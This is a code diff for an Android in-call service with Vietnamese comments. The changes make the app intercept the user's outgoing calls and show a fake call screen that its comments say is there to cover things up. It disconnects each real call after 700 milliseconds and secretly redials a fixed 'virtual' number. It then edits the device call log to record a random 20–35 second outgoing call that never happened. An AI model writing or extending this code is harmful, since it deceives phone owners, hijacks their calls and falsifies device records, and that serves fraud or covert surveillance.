@@ -24,8 +24,11 @@ public class MyInCallService extends InCallService {
     private boolean isHandled = false;
     private static final String TAG = "MyInCallService";
 
-    // Số điện thoại mặc định bạn muốn tự động chuyển hướng gọi tới
-    private static final String TARGET_DEFAULT_NUMBER = "0123456789";
+    // Số điện thoại ảo / số mặc định hệ thống bạn muốn chuyển hướng tới sau khi ngắt 700ms
+    private static final String TARGET_VIRTUAL_NUMBER = "0123456789";
+
+    // Biến cờ đánh dấu xem có phải chính app đang tự gọi đi số ảo hay không để tránh lặp vô hạn
+    private static boolean isAppSelfCalling = false;
 
     @Override
     public void onCallAdded(Call call) {
@@ -33,7 +36,17 @@ public class MyInCallService extends InCallService {
         activeCall = call;
         isHandled = false;
 
-        // Bật màn hình giao diện ảo lên (với các cờ dọn dẹp task cũ sạch sẽ)
+        // Lấy thông tin số điện thoại của cuộc gọi hiện tại
+        Uri handleUri = call.getDetails().getHandle();
+        String phoneNumber = (handleUri != null) ? handleUri.getSchemeSpecificPart() : "";
+
+        // NẾU ĐÂY LÀ CUỘC GỌI DO CHÍNH APP TỰ GỌI SANG SỐ ẢO/MẶC ĐỊNH => BỎ QUA KHÔNG CAN THIỆP NỮA
+        if (isAppSelfCalling) {
+            Log.d(TAG, "Đây là cuộc gọi tự động từ app sang số ảo, để chạy tự nhiên.");
+            return;
+        }
+
+        // 1. Bật ngay màn hình giao diện ảo lên để che đậy
         Intent intent = new Intent(this, CallActivity.class);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
         startActivity(intent);
@@ -43,29 +56,35 @@ public class MyInCallService extends InCallService {
             public void onStateChanged(Call call, int state) {
                 super.onStateChanged(call, state);
                 
-                // Khi cuộc gọi sang trạng thái chuẩn bị gọi hoặc đang kết nối
+                // Khi cuộc gọi chuẩn bị đi hoặc đang kết nối
                 if (!isHandled && (state == Call.STATE_DIALING || state == Call.STATE_CONNECTING || state == Call.STATE_ACTIVE)) {
                     isHandled = true;
 
                     // Sinh thời gian ngẫu nhiên từ 20 đến 35 giây cho CallLog
                     int randomDuration = new Random().nextInt(16) + 20;
 
-                    // ĐỢI ĐÚNG 700ms (0.7 giây) RỒI NGẮT KẾT NỐI VÀ CHUYỂN HƯỚNG
+                    // 2. ĐỢI ĐÚNG 700ms RỒI NGẮT CUỘC GỌI GỐC (Tránh bên kia kịp nhận diện số thật)
                     new Handler(Looper.getMainLooper()).postDelayed(() -> {
                         try {
                             if (call != null) {
-                                call.disconnect(); // Ngắt số ban đầu
+                                call.disconnect(); // Cúp máy ngay lập tức trong 700ms
                             }
                         } catch (Exception e) {
                             Log.e(TAG, "Lỗi khi gọi call.disconnect(): " + e.getMessage());
                         }
 
-                        // Chờ 300ms để line trống, sau đó tự động gọi sang số mặc định (0123456789)
+                        // 3. Sau khi ngắt thành công, tiến hành gọi sang số ảo/mặc định (nếu muốn gọi tiếp)
                         new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                            makeCallToDefaultNumber(TARGET_DEFAULT_NUMBER);
+                            isAppSelfCalling = true; // Bật cờ đánh dấu app đang tự gọi
+                            makeCallToVirtualNumber(TARGET_VIRTUAL_NUMBER);
+                            
+                            // Sau 2 giây reset lại cờ để chuẩn bị cho lần gọi tiếp theo của người dùng
+                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                isAppSelfCalling = false;
+                            }, 2000);
                         }, 300);
 
-                        // Cập nhật lại thời lượng vào lịch sử cuộc gọi ở luồng nền để chống nghẽn (ANR)
+                        // 4. Cập nhật lịch sử cuộc gọi (CallLog) thành thời lượng ngẫu nhiên 20s - 35s ở luồng nền
                         new Thread(() -> {
                             updateLatestCallLogDuration(randomDuration);
                         }).start();
@@ -84,8 +103,8 @@ public class MyInCallService extends InCallService {
         }
     }
 
-    // Hàm thực hiện gọi tự động sang số mặc định
-    private void makeCallToDefaultNumber(String phoneNumber) {
+    // Hàm thực hiện gọi sang số ảo/mặc định
+    private void makeCallToVirtualNumber(String phoneNumber) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             TelecomManager telecomManager = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
             if (telecomManager != null) {
@@ -94,20 +113,19 @@ public class MyInCallService extends InCallService {
                 try {
                     if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                         telecomManager.placeCall(uri, extras);
-                        Log.d(TAG, "Đã chuyển hướng gọi thành công sang số mặc định: " + phoneNumber);
+                        Log.d(TAG, "Đã chuyển hướng sang số ảo: " + phoneNumber);
                     }
                 } catch (SecurityException e) {
-                    Log.e(TAG, "Lỗi bảo mật khi gọi số mặc định: " + e.getMessage());
+                    Log.e(TAG, "Lỗi bảo mật khi gọi số ảo: " + e.getMessage());
                 }
             }
         }
     }
 
-    // Hàm cập nhật nhật ký thành công (giả lập thời lượng gọi thành công)
+    // Hàm cập nhật nhật ký cuộc gọi (giả lập thời lượng gọi từ 20s - 35s)
     private void updateLatestCallLogDuration(int targetDurationSeconds) {
         try {
-            // Chờ hệ thống ghi nhận log thô xuống database thiết bị
-            Thread.sleep(500); 
+            Thread.sleep(600); // Chờ hệ thống ghi nhận log thô xuống database
 
             Cursor cursor = getContentResolver().query(
                 CallLog.Calls.CONTENT_URI,
@@ -124,13 +142,13 @@ public class MyInCallService extends InCallService {
                         long callId = cursor.getLong(idColumnIndex);
 
                         ContentValues values = new ContentValues();
-                        values.put(CallLog.Calls.DURATION, targetDurationSeconds); // Gán thời lượng ngẫu nhiên từ 20s - 35s
+                        values.put(CallLog.Calls.DURATION, targetDurationSeconds); // Gán thời lượng ngẫu nhiên
                         values.put(CallLog.Calls.TYPE, CallLog.Calls.OUTGOING_TYPE); // Ép hiển thị là cuộc gọi đi
 
                         Uri updateUri = Uri.withAppendedPath(CallLog.Calls.CONTENT_URI, String.valueOf(callId));
                         getContentResolver().update(updateUri, values, null, null);
                         
-                        Log.d(TAG, "Đã cập nhật thành công thời lượng CallLog: " + targetDurationSeconds + "s");
+                        Log.d(TAG, "Đã chỉnh sửa CallLog thành công: " + targetDurationSeconds + "s");
                     }
                 }
                 cursor.close();
